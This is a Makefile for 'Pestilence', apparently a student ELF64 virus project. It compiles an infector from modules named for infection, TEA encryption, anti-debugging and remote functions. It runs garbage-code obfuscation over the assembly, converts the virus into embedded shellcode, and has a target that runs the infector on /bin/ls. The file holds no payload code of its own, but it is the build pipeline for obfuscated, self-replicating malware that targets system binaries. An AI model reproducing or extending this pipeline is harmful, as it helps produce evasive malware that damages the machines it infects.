NAME = Pestilence

FLAGS = -MD -fno-stack-protector -fPIC -fPIE 

SRC_DIR				= .
TMP_DIR				= .tmp
OBJ_DIR				= $(TMP_DIR)/obj

TABLE_C = $(TMP_DIR)/table.c
LIBFLAGS = -I lib -I lib/ft_lib -I lib/crypto -I lib/formats -I lib/hacks
VIRUS = virus

FTLIB_SRC = ft_io.c ft_string.c ft_lib.c
FORMATS_SRC = elf64.c
CRYPTO_SRC = compression.c tea_encrypt.c
HACKS_SRC = antidebug.c remote.c
INFECT_SRC = infect.c

FTLIB = $(addprefix lib/ft_lib/, $(FTLIB_SRC))
FORMATS = $(addprefix lib/formats/, $(FORMATS_SRC))
CRYPTO = $(addprefix lib/crypto/, $(CRYPTO_SRC))
HACKS = $(addprefix lib/hacks/, $(HACKS_SRC))
INFECT = $(addprefix lib/, $(INFECT_SRC))

OBJ_LIBS = $(addprefix $(OBJ_DIR)/, lib/ft_lib lib/ft_formats lib/crypto lib/hacks lib)

SRC_C = virus/main.c $(FTLIB) $(INFECT) $(FORMATS) $(CRYPTO) $(HACKS) $(TABLE_C)
SRC_S = virus/start.s lib/crypto/tea_decrypt.s

OBJ	=	$(addprefix $(OBJ_DIR)/, $(SRC_C:.c=.o)) \
		$(addprefix $(OBJ_DIR)/, $(SRC_S:.s=.o)) \

SRC_INF_C = infector/main.c $(FTLIB) $(INFECT) $(FORMATS)

OBJ_INF	= $(addprefix $(OBJ_DIR)/, $(SRC_INF_C:.c=.o))

DEP =		$(addprefix $(OBJ_DIR)/, $(SRC_C:.c=.d)) \
		$(addprefix $(OBJ_DIR)/, $(SRC_INF_C:.c=.d))

VIRUS = $(TMP_DIR)/virus.template
VIRUS_X = $(TMP_DIR)/virus_shellcode.c

LD_RULES = virus/rules.lds

all: nop $(NAME)

nop:

$(NAME):  $(VIRUS_X) $(OBJ_INF)
	gcc -o $(NAME) $(OBJ_INF) $(VIRUS_X)

$(VIRUS_X): $(VIRUS)
	cp $< virus_shellcode
	xxd -i virus_shellcode $(VIRUS_X)
	rm virus_shellcode

$(VIRUS): $(OBJ) $(LD_RULES)
	ld -o $@ -T $(LD_RULES) $(OBJ)
	nm -n .tmp/virus.template | grep ' B \| b ' | diff - /dev/null || rm $(VIRUS)

$(TMP_DIR):
	mkdir -p $@

$(OBJ_DIR):
	mkdir -p $@
	find -type d -links 2 -exec mkdir -p $(OBJ_DIR)"/{}" \;
	rm -rf $(OBJ_DIR)/others

##
## GARBAGE CODE
##

GARBAGE_CF = $(TMP_DIR)/garbage.txt

$(GARBAGE_CF): $(TMP_DIR)
	echo "0" > $@

$(TMP_DIR)/virus.s.g.s: $(TMP_DIR)/virus.s $(GARBAGE_CF)
	#cp $< $@
	# nm --defined-only .tmp/obj/virus.o | grep -v '\.' | grep -i ' t ' | cut -d ' ' -f 3
	./others/scripts/add_garbage $< -cf $(GARBAGE_CF) -p 200 -l decrypt do_infection entry virus
	#./scripts/add_garbage $< -p 200 -l .ALL

$(TMP_DIR)/lib/lib.s.g.s: $(TMP_DIR)/lib/lib.s $(GARBAGE_CF)
	#cp $< $@
	./others/scripts/add_garbage $< -cf $(GARBAGE_CF) -p 200 -l ft_open
	#./scripts/add_garbage $< -cf $(GARBAGE_CF) -p 200 -l add_base call close contains d_isdir d_isfile execve exit ffree fget fork fput free getdents getenv getpid lseek malloc _malloc malloc_shared open print println printnb printnbln ptrace read restore_rt scmp signal slen snbr sncmp startswith str_equal waitpid write xstat

$(TABLE_C): $(GARBAGE_CF)
	./others/scripts/gen_garbage_table -n `cat $(GARBAGE_CF)` -o $@

##
## END
##

$(OBJ_DIR)/%.o: $(TMP_DIR)/%.s.g.s | $(OBJ_DIR)
	gcc $(FLAGS) $(LIBFLAGS) -c $< -o $(OBJ_DIR)/$(notdir $@)

$(OBJ_DIR)/%.o: %.c | $(OBJ_DIR)
	gcc $(FLAGS) $(LIBFLAGS) -c $< -o $@

$(OBJ_DIR)/%.o: %.s | $(OBJ_DIR)
	nasm -f elf64 $< -o $@

clean:
	rm -rf $(DEP)
	rm -rf $(OBJ)
	rm -rf $(OBJ_DIR)
	rm -rf $(TMP_DIR)
	rm -rf $(TABLE_C)

fclean: clean
	rm -rf $(NAME)

re: fclean
	echo $(DEP)
	$(MAKE)

-include $(DEP)

.PHONY: all re clean fclean test unit_test

test: all
	(cd test && ./run.sh)

ls: all
	./$(NAME) /bin/ls